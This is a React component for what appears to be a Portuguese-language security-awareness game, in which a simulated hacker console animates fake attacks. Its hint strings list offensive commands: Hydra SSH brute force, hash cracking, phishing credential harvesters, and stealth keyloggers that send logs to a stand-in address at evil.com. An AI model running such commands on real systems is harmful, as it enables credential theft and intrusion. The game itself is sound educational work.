import { useState, useMemo, useEffect, useRef } from "react";
import { useMutation } from "@tanstack/react-query";
import { queryClient, apiRequest } from "@/lib/queryClient";
import type { GameState } from "@shared/schema";
import { attackTypes } from "@shared/schema";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Stepper } from "@/components/ui/stepper";
import { TerminalOutput } from "@/components/terminal-output";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Terminal, Target, Play, Zap } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { cn } from "@/lib/utils";

interface HackerPanelProps {
  gameState: GameState;
}

export function HackerPanel({ gameState }: HackerPanelProps) {
  const { toast } = useToast();
  const [selectedAttack, setSelectedAttack] = useState<string | null>(null);
  const [attackStep, setAttackStep] = useState(0);
  const [selectedTool, setSelectedTool] = useState('');
  const [command, setCommand] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const [attackProgress, setAttackProgress] = useState(0);
  const progressIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const attackTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    return () => {
      if (progressIntervalRef.current) {
        clearInterval(progressIntervalRef.current);
      }
      if (attackTimeoutRef.current) {
        clearTimeout(attackTimeoutRef.current);
      }
    };
  }, []);

  const executeAttackMutation = useMutation({
    mutationFn: (attackId: string) =>
      apiRequest('POST', '/api/attack/execute', { attackId }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/game-state'] });
      setSelectedAttack(null);
      setAttackStep(0);
      setSelectedTool('');
      setCommand('');
      setIsExecuting(false);
    },
  });

  const handleStartAttack = (attackId: string) => {
    setSelectedAttack(attackId);
    setAttackStep(1);
  };

  const handleSelectTool = (tool: string) => {
    setSelectedTool(tool);
    setAttackStep(2);
  };

  const handleExecuteCommand = () => {
    if (!selectedAttack) return;
    
    setIsExecuting(true);
    setAttackStep(3);
    setAttackProgress(0);
    
    // Limpar intervalos anteriores
    if (progressIntervalRef.current) {
      clearInterval(progressIntervalRef.current);
    }
    if (attackTimeoutRef.current) {
      clearTimeout(attackTimeoutRef.current);
    }
    
    // Simular progresso do ataque com animação
    progressIntervalRef.current = setInterval(() => {
      setAttackProgress(prev => {
        if (prev >= 100) {
          if (progressIntervalRef.current) {
            clearInterval(progressIntervalRef.current);
          }
          return 100;
        }
        return prev + 2;
      });
    }, 40);
    
    // Executar ataque após animação
    attackTimeoutRef.current = setTimeout(() => {
      executeAttackMutation.mutate(selectedAttack);
      setIsExecuting(false);
      setAttackProgress(0);
    }, 3000);
  };

  const getAttackTools = (attackId: string) => {
    const tools: Record<string, string[]> = {
      social_engineering: ['Social Mapper', 'SET Toolkit', 'Maltego'],
      phishing: ['Gophish', 'King Phisher', 'Social Engineer Toolkit'],
      brute_force: ['Hydra', 'John the Ripper', 'Hashcat'],
      keylogger: ['KeyLogger Pro', 'Spyrix', 'Actual Keylogger'],
      password_leak: ['Shodan', 'Have I Been Pwned API', 'DeHashed'],
    };
    return tools[attackId] || [];
  };

  const getAttackCommands = (attackId: string, tool: string) => {
    const commands: Record<string, Record<string, string>> = {
      social_engineering: {
        'Social Mapper': 'python social_mapper.py -f linkedin -i targets.txt',
        'SET Toolkit': 'setoolkit --phishing --credential-harvester',
        'Maltego': 'maltego --investigate --target user@email.com',
      },
      phishing: {
        'Gophish': 'gophish launch --template fake_login --targets list.csv',
        'King Phisher': 'king-phisher-server --config phishing.yml',
        'Social Engineer Toolkit': 'set --phishing-attack --clone-website',
      },
      brute_force: {
        'Hydra': 'hydra -l user -P passwords.txt ssh://target.com',
        'John the Ripper': 'john --wordlist=rockyou.txt hashes.txt',
        'Hashcat': 'hashcat -m 0 -a 0 hash.txt wordlist.txt',
      },
      keylogger: {
        'KeyLogger Pro': 'keylogger.exe --stealth --output logs.txt',
        'Spyrix': 'spyrix-start --hidden --email send@me.com',
        'Actual Keylogger': 'akl.exe /silent /email:hacker@evil.com',
      },
      password_leak: {
        'Shodan': 'shodan search "database" --limit 100',
        'Have I Been Pwned API': 'curl https://api.pwnedpasswords.com/range/HASH',
        'DeHashed': 'dehashed --email target@email.com',
      },
    };
    return commands[attackId]?.[tool] || '';
  };

  const terminalLines = useMemo(() => {
    if (!selectedAttack) return [];
    const attackId = selectedAttack;
    const attack = attackTypes.find(a => a.id === attackId);
    if (!attack) return [];

    type TerminalLine = { text: string; type?: 'input' | 'output' | 'error' | 'success' | 'warning'; delay?: number };
    const progressLines: TerminalLine[] = [];
    
    if (attackProgress > 10) {
      progressLines.push({ text: '[*] Scanning target systems...', type: 'output' as const, delay: 300 });
    }
    if (attackProgress > 25) {
      progressLines.push({ text: '[+] Target acquired: ' + (gameState.casualUser.email || 'unknown'), type: 'success' as const, delay: 300 });
    }
    if (attackProgress > 40) {
      progressLines.push({ text: '[*] Analyzing security measures...', type: 'output' as const, delay: 300 });
      const activeMeasures = Object.entries(gameState.casualUser.securityMeasures)
        .filter(([_, enabled]) => enabled)
        .map(([key]) => key);
      if (activeMeasures.length > 0) {
        progressLines.push({ text: `[!] Detected defenses: ${activeMeasures.join(', ')}`, type: 'warning' as const, delay: 300 });
      }
    }
    if (attackProgress > 60) {
      progressLines.push({ text: '[*] Executing exploit...', type: 'output' as const, delay: 300 });
    }
    if (attackProgress > 80) {
      progressLines.push({ text: '[*] Bypassing security layers...', type: 'output' as const, delay: 300 });
    }

    const baseLines: TerminalLine[] = [
      { text: `╔═══════════════════════════════════╗`, type: 'output' as const, delay: 100 },
      { text: `║  ${attack.name.toUpperCase()}`, type: 'output' as const, delay: 100 },
      { text: `╚═══════════════════════════════════╝`, type: 'output' as const, delay: 100 },
      { text: '', type: 'output' as const, delay: 100 },
      { text: `${command}`, type: 'input' as const, delay: 500 },
      { text: '', type: 'output' as const, delay: 100 },
      { text: '[*] Initializing attack framework...', type: 'output' as const, delay: 300 },
      { text: '[+] Framework loaded successfully', type: 'success' as const, delay: 300 },
      ...progressLines,
    ];

    return baseLines;
  }, [selectedAttack, attackProgress, command, gameState.casualUser.email, gameState.casualUser.securityMeasures]);

  const currentAttack = attackTypes.find(a => a.id === selectedAttack);

  return (
    <div className="flex h-full flex-col overflow-y-auto bg-background">
      {/* Header minimalista */}
      <div className="border-b px-6 py-4">
        <div className="flex items-center gap-2 text-hacker-danger">
          <Terminal className="h-5 w-5" />
          <h2 className="text-lg font-semibold">Console do Hacker</h2>
        </div>
      </div>

      <div className="flex-1 space-y-8 p-6">
        {/* Attack Selection */}
        {!gameState.casualUser.accountCreated ? (
          <div className="flex h-64 items-center justify-center rounded-lg border border-dashed">
            <div className="text-center">
              <Target className="mx-auto mb-2 h-8 w-8 text-muted-foreground" />
              <p className="text-sm text-muted-foreground">
                Aguardando alvo criar conta...
              </p>
            </div>
          </div>
        ) : (
          <>
            <div>
              <h3 className="mb-4 text-sm font-medium text-muted-foreground">VETORES DE ATAQUE</h3>
              <div className="grid gap-2 sm:grid-cols-2">
                {attackTypes.map((attack) => {
                  const cooldown = gameState.hacker.cooldowns[attack.id];
                  const isOnCooldown = !!(cooldown && cooldown > Date.now());
                  const remainingTime = isOnCooldown ? Math.ceil((cooldown - Date.now()) / 1000) : 0;

                  return (
                    <button
                      key={attack.id}
                      onClick={() => !isOnCooldown && handleStartAttack(attack.id)}
                      disabled={isOnCooldown}
                      className={cn(
                        "relative overflow-hidden rounded-lg border p-4 text-left transition-all",
                        isOnCooldown
                          ? "cursor-not-allowed opacity-50"
                          : "hover:border-hacker-danger hover:bg-accent"
                      )}
                    >
                      {isOnCooldown && remainingTime > 0 && (
                        <div
                          className="absolute bottom-0 left-0 h-1 bg-hacker-danger transition-all"
                          style={{
                            width: `${(remainingTime / (attack.cooldown / 1000)) * 100}%`,
                          }}
                        />
                      )}
                      <div className="flex items-start gap-3">
                        <div className="rounded-md bg-hacker-danger/10 p-2">
                          <Zap className="h-5 w-5 text-hacker-danger" />
                        </div>
                        <div className="flex-1">
                          <h4 className="font-medium">{attack.name}</h4>
                          <p className="mt-1 text-xs text-muted-foreground">
                            {attack.description}
                          </p>
                          {isOnCooldown && (
                            <p className="mt-2 text-xs font-medium text-hacker-danger">
                              Cooldown: {remainingTime}s
                            </p>
                          )}
                        </div>
                      </div>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Stats */}
            <div>
              <h3 className="mb-4 text-sm font-medium text-muted-foreground">ESTATÍSTICAS</h3>
              <div className="grid gap-4 sm:grid-cols-2">
                <div className="rounded-lg border bg-muted/30 p-4">
                  <div className="text-2xl font-bold text-foreground">
                    {gameState.hacker.attacksAttempted}
                  </div>
                  <div className="text-xs text-muted-foreground">Ataques Tentados</div>
                </div>
                <div className="rounded-lg border bg-muted/30 p-4">
                  <div className="text-2xl font-bold text-hacker-danger">
                    {gameState.hacker.attacksSuccessful}
                  </div>
                  <div className="text-xs text-muted-foreground">Ataques Bem-Sucedidos</div>
                </div>
              </div>
            </div>
          </>
        )}
      </div>

      {/* Attack Execution Dialog */}
      <Dialog open={selectedAttack !== null} onOpenChange={() => setSelectedAttack(null)}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Terminal className="h-5 w-5 text-hacker-danger" />
              {currentAttack?.name}
            </DialogTitle>
            <DialogDescription>
              {currentAttack?.description}
            </DialogDescription>
          </DialogHeader>

          <Stepper
            steps={[
              { title: 'Reconhecimento' },
              { title: 'Execução' },
              { title: 'Resultado' },
            ]}
            currentStep={attackStep - 1}
          />

          {/* Step 1: Recon - Choose Tool */}
          {attackStep === 1 && (
            <div className="space-y-4">
              <p className="text-sm text-muted-foreground">Escolha uma ferramenta para o ataque:</p>
              <div className="space-y-2">
                {getAttackTools(selectedAttack!).map((tool) => (
                  <Button
                    key={tool}
                    variant="outline"
                    className="w-full justify-start font-mono text-sm"
                    onClick={() => handleSelectTool(tool)}
                  >
                    <Terminal className="mr-2 h-4 w-4" />
                    {tool}
                  </Button>
                ))}
              </div>
            </div>
          )}

          {/* Step 2: Execution - Write Command */}
          {attackStep === 2 && selectedTool && (
            <div className="space-y-4">
              <div>
                <p className="mb-2 text-sm text-muted-foreground">Ferramenta selecionada:</p>
                <div className="rounded-lg border bg-muted/30 p-3 font-mono text-sm">
                  {selectedTool}
                </div>
              </div>

              <div>
                <p className="mb-2 text-sm text-muted-foreground">Digite o comando:</p>
                <Input
                  placeholder="Digite o comando..."
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  className="font-mono text-sm"
                  onKeyDown={(e) => {
                    if (e.key === 'Enter' && command) {
                      handleExecuteCommand();
                    }
                  }}
                />
                <p className="mt-2 text-xs text-muted-foreground">
                  Dica: {getAttackCommands(selectedAttack!, selectedTool)}
                </p>
              </div>

              <div className="flex gap-2">
                <Button variant="outline" onClick={() => setAttackStep(1)} className="flex-1">
                  Voltar
                </Button>
                <Button
                  onClick={handleExecuteCommand}
                  disabled={!command}
                  className="flex-1 bg-hacker-danger hover:bg-hacker-danger/90"
                >
                  <Play className="mr-2 h-4 w-4" />
                  Executar Ataque
                </Button>
              </div>
            </div>
          )}

          {/* Step 3: Outcome - Terminal Output */}
          {attackStep === 3 && (
            <div className="space-y-4">
              <TerminalOutput
                lines={terminalLines}
                isRunning={isExecuting}
                showProgress={isExecuting}
                progress={attackProgress}
              />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
